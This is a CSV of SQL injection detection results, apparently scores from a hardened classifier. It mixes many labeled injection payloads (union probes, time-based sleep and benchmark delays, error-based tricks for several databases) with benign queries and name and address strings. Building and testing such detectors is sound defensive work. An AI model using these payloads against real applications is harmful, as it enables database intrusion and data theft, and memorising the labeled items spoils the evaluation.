payload,label,hardened_pred_label,hardened_pred_score
1   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  4694  =  4694,1,1,0.99999154
SELECT COUNT ( partly ) FROM window,0,0,8.149075e-06
"-8654' union all select 7190,7190,7190,7190,7190#",1,1,0.99999166
"1  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0.99999154
"   SELECT world, dress, killFROM station WHERE letter  IS NOT NULL",0,0,8.005732e-06
SELECT flew FROM couple UNION ALL SELECT wrapped FROM turn ORDER BY yesterday,0,0,8.101946e-06
"1""  )   as vcir where 6275  =  6275 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0.99999154
SELECT * FROM freedom FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM motion,0,0,7.882758e-06
SELECT * FROM moon 3,0,0,8.062728e-06
villafranca del bierzo,0,0,7.901536e-06
1' where 9816  =  9816 and 7533  =  7533--,1,1,0.99999166
SELECT option_value FROM wp_options WHERE option_name  =  'kc_options' LIMIT 1,0,0,7.953125e-06
"1"" rlike sleep  (  5  )  ",1,1,0.99999166
"1"" where 9760  =  9760 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,0.99999154
SELECT * FROM sheep  WHERE window NOT LIKE '[north]%',0,0,8.069404e-06
SELECT * FROM rice WHERE Price NOT BETWEEN 10 AND 20,0,0,8.0150285e-06
SELECT * FROM too WHERE similar LIKE '%material%',0,0,8.127484e-06
"-5776%' union all select 3075,3075,3075,3075,3075--",1,1,0.99999166
SELECT COUNT ( park ) FROM title,0,0,8.080256e-06
SELECT * FROM poem  WHERE brush NOT LIKE '[furniture]%',0,0,7.996178e-06
brion6,0,0,7.978529e-06
1'  )   where 8776  =  8776 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,0.99999154
SELECT so ( s )  FROM love FULL OUTER JOIN,0,0,7.867211e-06
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,1,0.99999154
SELECT cook FROM lot,0,0,8.121356e-06
d75a4r45der,0,0,7.906549e-06
SELECT everywhere ( s )  FROM also UNION,0,0,8.015823e-06
select case when 6420  =  7941 then 1 else null end--,1,1,0.99999166
descrieres@enibiza.com.ac,0,0,7.91195e-06
SELECT compare ( s FROM supply RIGHT JOIN,0,0,8.105486e-06
select case when 7951  =  1147 then 1 else null end--,1,1,0.99999166
SELECT AVG ( angry )  FROM bend  SELECT SUM ( palace ) ,0,0,7.942302e-06
"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0.99999154
"aaiun, 122 12?f",0,0,7.90226e-06
mathieso,0,0,7.9754855e-06
extremosa,0,0,7.997985e-06
SELECT AVG ( came )  FROM fix  SELECT SUM ( cut ) ,0,0,7.949955e-06
"1"" where 3318  =  3318",1,1,0.99999166
basset ramos,0,0,7.9585725e-06
SELECT * FROM whose WHERE Price NOT BETWEEN 10 AND 20,0,0,8.060475e-06
SELECT * FROM write FETCH FIRST 3 ROWS ONLY,0,0,7.891558e-06
"  SELECT Orders.whisperedrID, Employees.dark, Employees.definition FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fortyID ORDER BY Orders.moonID",0,0,8.388075e-06
1437,0,0,7.9986185e-06
"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,0.99999154
1  )   where 7026  =  7026,1,1,0.99999166
   )    )    or pg_sleep  (  __TIME__  )  --,1,1,0.99999166
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,0.99999154
torreblacos,0,0,7.938045e-06
"1'  )   where 9091  =  9091 union all select null,null,null,null#",1,1,0.99999166
SELECT * FROM cause WHERE atomic = 'plural',0,0,8.120449e-06
"-3756'  )   union all select 1034,1034,1034--",1,1,0.99999166
-2431'  )   or 8571  =  8571--,1,1,0.99999166
1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg,1,1,0.99999154
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fjwv"" like ""fjwv",1,1,0.99999154
SELECT TOP 3 * FROM fewer WHERE spend = 'library',0,0,8.083616e-06
guciz,0,0,7.975836e-06
"-4923"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""afjc"" like ""afjc",1,1,0.99999154
SELECT storm ( s )  FROM might UNION ALL,0,0,7.999168e-06
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,0.99999154
SELECT * FROM across FETCH FIRST 3 ROWS ONLY,0,0,7.958391e-06
7u4o84z1m07459,0,0,7.910599e-06
SELECT * FROM voyage FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM wheel,0,0,7.86812e-06
1'||  (  select 'ghby' from dual where 4854  =  4854,1,1,0.99999166
"1""   )    )    as etap where 8506  =  8506 union all select null,null,null,null#",1,1,0.99999166
-8378%'  )   union all select 5491#,1,1,0.99999166
"   SELECT farm, worried, builtFROM magic WHERE team  IS NOT NULL",0,0,7.981071e-06
uvalle urpina,0,0,7.9137235e-06
SELECT * FROM advice WHERE question BETWEEN '1996-07-01' AND '1996-07-31',0,0,7.860537e-06
pesantez,0,0,7.9962465e-06
"-4927'   )    )    union all select 1924,1924#",1,1,0.99999166
SELECT * FROM particularly WHERE unless BETWEEN 'heavy' AND 'push',0,0,8.147832e-06
SELECT those ( s )  FROM drawn SELECT wrong ( s ) ,0,0,7.864458e-06
-2505' or 9323  =  9323#,1,1,0.99999166
SELECT TOP 3 * FROM powerful,0,0,8.076827e-06
bogs terradas,0,0,7.92998e-06
fonterosa vjar,0,0,7.9122065e-06
SELECT COUNT ( funny )  FROM understanding,0,0,8.103368e-06
49439340n,0,0,7.942748e-06
hofmeist0,0,0,7.950569e-06
"1%""   )    )     )   and 1594  =  8757",1,1,0.99999166
nalbach0@softwaremasservicio.aero,0,0,7.920805e-06
39sch6nz6da,0,0,7.914644e-06
"1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,0.99999166
"   SELECT Employees.plates, COUNT ( Orders.burstID )  AS patternFROM    ( OrdersINNER JOIN safe ON Orders.youID  =  Employees.callID ) ",0,0,7.87459e-06
sosao,0,0,7.988853e-06
"1"" where 3484  =  3484 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,0.99999154
SELECT MIN ( without )  AS pool FROM mental,0,0,8.154222e-06
"1',  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",1,1,0.99999154
"1"" where 3368  =  3368 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0.99999166
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",1,1,0.99999154
"-2855""   )    )     )   union all select 1496,1496,1496,1496#",1,1,0.99999166
"   SELECT Employees.down, COUNT ( Orders.wishID )  AS particlesFROM    ( OrdersINNER JOIN animal ON Orders.specialID  =  Employees.breadID ) ",0,0,7.925361e-06
SELECT TOP 3 * FROM badly,0,0,8.128569e-06
SELECT * FROM share,0,0,8.228873e-06
SELECT cannot FROM half UNION SELECT curve FROM very ORDER BY machinery,0,0,8.192243e-06
1%'   )    )     )   or sleep  (  5  )   and    (    (     (  '%'  =  ',1,1,0.99999166
1'  )   where 1183  =  1183,1,1,0.99999166
 UPDATE quick SET planning = 'under'WHERE another = 'of',0,0,7.876888e-06
84411118z,0,0,7.929601e-06
SELECT * FROM hungry,0,0,8.154937e-06
"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,0.99999154
hoefer.tabuyo@gopersonalfitness.nz,0,0,7.931704e-06
SELECT taught ( s )  FROM did SELECT clock ( s ) ,0,0,8.269111e-06
"c/ juan luis peralta, 49 13-f",0,0,8.005372e-06
SELECT * FROM animal WHERE deer = 'announced'  AND  ( top = 'struggle' OR mile = 'living' ) ,0,0,7.942559e-06
polop,0,0,8.0278805e-06
SELECT * FROM year WHERE represent = 'natural',0,0,8.198918e-06
8.90606E+14,0,0,7.931606e-06
SELECT slave ( s )  FROM important UNION ALL,0,0,8.011544e-06
"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1,1,0.99999154
"1'  )   as ssez where 5351  =  5351 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0.99999154
" SELECT o.OrderID, o.OrderDate, c.CustomerName FROM Customers AS c, Orders AS o WHERE c.CustomerName = 'Around the Horn' AND c.CustomerID = o.CustomerID;",0,0,7.859389e-06
"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""enfu""  =  ""enfu",1,1,0.99999154
"-8369""   )    )    union all select 2191--",1,1,0.99999166
‘ or 3  =  3 --,1,1,0.99999166
1'  )   where 9538  =  9538,1,1,0.99999166
1  )   as fhvr where 5544  =  5544,1,1,0.99999166
select case when 4537  =  8418 then 1 else null end--,1,1,0.99999166
-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,1,0.99999154
virge,0,0,8.037011e-06
4.43193E+15,0,0,7.907854e-06
44651,0,0,8.036535e-06
SELECT save ( s )  FROM fairly UNION ALL,0,0,7.928604e-06
SELECT * FROM  ( SELECT highway FROM walk ) ,0,0,8.020197e-06
-4428  )   or 3038  =  3038,1,1,0.99999166
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 5421 )  ORDER BY meta_id ASC",0,0,7.844458e-06
47282,0,0,8.031532e-06
"ferrer del rio, 126 2?h",0,0,7.9096035e-06
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM catch,0,0,7.839717e-06
"   SELECT lack, no, previousFROM twenty WHERE nails  IS NOT NULL",0,0,8.071837e-06
"-4515""  )   or elt  (  4545  =  2509,2509  )   and   (  ""lglx""  =  ""lglx",1,1,0.99999166
SELECT * FROM ran WHERE element NOT LIKE '[spell]%',0,0,8.055572e-06
"1""   )    )     )   and   (  7396  =  6351  )  *6351 and    (    (     (  ""xerw"" like ""xerw",1,1,0.99999154
peaflor de hornija,0,0,7.913829e-06
SELECT * FROM cast  WHERE test = mood,0,0,8.182779e-06
SELECT * FROM  ( SELECT clothes FROM home ) ,0,0,8.014898e-06
50619,0,0,8.014662e-06
"-5052   )    )     )   union all select 8351,8351,8351,8351#",1,1,0.99999166
SELECT * FROM wp_posts WHERE ID  =  55211 LIMIT 1,0,0,7.934791e-06
freixes navaln,0,0,7.911248e-06
co85863o,0,0,7.929178e-06
"   SELECT Employees.swam, COUNT ( Orders.combineID )  AS laterFROM    ( OrdersINNER JOIN move ON Orders.buriedID  =  Employees.askID ) ",0,0,7.8801795e-06
1'+  (  select 'xpby' where 2724  =  2724,1,1,0.99999166
1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,1,1,0.99999166
1' and 7528  =  2894 and 'qoyw'  =  'qoyw,1,1,0.99999166
50700,0,0,8.015579e-06
3.81793E+14,0,0,8.136976e-06
"  SELECT rock,pretty FROM fruit WHERE country = 'stared' UNION SELECT naturally, most FROM least",0,0,7.985981e-06
-7111' or   (  8459  =  8459  )  *4906,1,1,0.99999166
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'  =  'xemh",1,1,0.99999166
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE t.term_id  =  715",0,0,7.9089095e-06
SELECT TOP 50 PERCENT * FROM piano,0,0,7.905863e-06
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""woun"" like ""woun",1,1,0.99999154
napolen,0,0,7.972322e-06
"1%"" and 2805  =  1345",1,1,0.99999154
-3185'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'rknd' like 'rknd,1,1,0.99999154
"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",1,1,0.99999166
SELECT adult ( s )  FROM season SELECT easy ( s ) ,0,0,8.113645e-06
mandruso,0,0,7.989691e-06
" SELECT * FROM another ORDER BY willing ASC, pot DESC",0,0,8.055626e-06
SELECT triangle,0,0,8.103955e-06
"-9227  )   where 6723  =  6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",1,1,0.99999166
SELECT * FROM all WHERE Price NOT BETWEEN 10 AND 20,0,0,8.003212e-06
moyes,0,0,7.990317e-06
-3297' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1,1,0.99999154
"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",1,1,0.99999166
DELETE FROM string,0,0,7.842551e-06
lap-pun2@streaptease.hk,0,0,7.93747e-06
garner3,0,0,7.99261e-06
griffith_chesbro@psykoterapeut.sn,0,0,7.943013e-06
select   (  case when   (  8233  =  1074  )   then 8233 else 1/  (  select 0  )   end  )  --,1,1,0.99999154
"INSERT INTO sudden ( anybody, turn, faster, replace, tune, rose )  VALUES  ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )  ",0,0,7.811946e-06
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'hgtg'  =  'hgtg,1,1,0.99999154
"1%""   )    )     )   and elt  (  9524  =  1124,1124  )   and    (    (     (  ""%""  =  """,1,1,0.99999154
SELECT division ( s )  FROM satisfied UNION,0,0,8.04471e-06
"   SELECT CustomerName, ContactName, AddressFROM CustomersWHERE Address   IS NOT NULL;",0,0,7.881156e-06
update,1,1,0.9999863
huesca,0,0,7.971722e-06
r8cid0va,0,0,7.918086e-06
SELECT * FROM active FETCH FIRST 3 ROWS ONLY,0,0,7.8701305e-06
1'  )   as bzem where 4240  =  4240,1,1,0.99999166
"1""  )   where 2473  =  2473 and make_set  (  6118  =  7684,7684  )  --",1,1,0.99999166
SELECT * FROM Customers ORDER BY CustomerName DESC;,0,0,7.988457e-06
"1' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,0.99999166
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'yaml'  =  'yaml",1,1,0.99999154
SELECT * FROM machinery 3 SELECT * FROM southern,0,0,8.110465e-06
SELECT AVG ( Price )  FROM Products;,0,0,8.091159e-06
SELECT smile FROM river,0,0,8.080818e-06
canal dolcet,0,0,7.912916e-06
SELECT DISTINCT wonderful FROM courage,0,0,8.133416e-06
" SELECT * FROM unusual ORDER BY section, deep",0,0,8.194063e-06
"1""  )   where 3084  =  3084 union all select null,null--",1,1,0.99999166
SELECT rose FROM muscle UNION SELECT tiny FROM our ORDER BY helpful,0,0,7.951836e-06
" SELECT LOCATE ( ""a"", CustomerName )  FROM Customers;",0,0,7.8435305e-06
-2411 or   (  8459  =  8459  )  *4906# pxwg,1,1,0.99999166
1'||  (  select 'ussi' where 8958  =  8958,1,1,0.99999166
"1""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0.99999154
31587,0,0,8.038421e-06
SELECT * FROM Orders WHERE OrderDate BETWEEN #07/01/1996# AND #07/31/1996#;,0,0,7.90324e-06
SELECT * FROM sense WHERE lay = 'independent' LIMIT 3,0,0,8.096586e-06
SELECT * FROM honor 3,0,0,8.27802e-06
molledo basagaa,0,0,7.9172105e-06
duthie,0,0,7.966652e-06
SELECT * FROM dot WHERE hungry = 'threw',0,0,7.875311e-06
murgua aversa,0,0,7.91552e-06
SELECT build ( s )  FROM experiment UNION ALL,0,0,7.937954e-06
SELECT * FROM car WHERE five = 'person'  AND  ( recently = 'yet' OR adult = 'second' ) ,0,0,7.931885e-06
DELETE FROM speech WHERE move = 'coat',0,0,7.935835e-06
SELECT * FROM call,0,0,8.113807e-06
"1%""  )   union all select null,null,null,null,null,null,null,null#",1,1,0.99999166
SELECT MIN ( she )  AS his FROM spell,0,0,8.143427e-06
12466,0,0,8.031379e-06
"   SELECT important, kill, whyFROM snow WHERE creature  IS NOT NULL",0,0,8.089971e-06
37655511a,0,0,7.9355705e-06
SELECT hurried ( s ) FROM saw INNER JOIN,0,0,8.013454e-06
"select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--",1,1,0.99999166
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""xwnw""  =  ""xwnw",1,1,0.99999166
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'crus'  =  'crus",1,1,0.99999166
-7199' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'qibr'  =  'qibr,1,1,0.99999154
SELECT * FROM something WHERE scared = 'whispered' LIMIT 3,0,0,8.0469035e-06
"1'  )   where 8948  =  8948 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,0.99999166
"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt",1,1,0.99999166
"c/ animas, 101,",0,0,7.987032e-06
